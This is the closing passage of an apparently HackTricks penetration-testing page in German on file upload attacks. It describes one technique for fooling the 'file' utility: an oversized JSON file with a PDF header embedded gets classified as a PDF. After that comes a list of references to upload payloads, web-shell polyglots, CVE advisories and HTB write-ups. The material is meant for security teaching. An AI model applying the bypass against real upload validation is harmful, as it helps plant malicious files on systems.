- **`file` binary**: Es kann bis zu 1048576 Bytes von einer Datei lesen. Erstelle einfach ein JSON, das größer ist als dieser Wert, sodass es den Inhalt nicht als JSON parsen kann, und füge dann innerhalb des JSON den Anfangsteil einer echten PDF ein — es wird denken, es sei ein PDF.

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
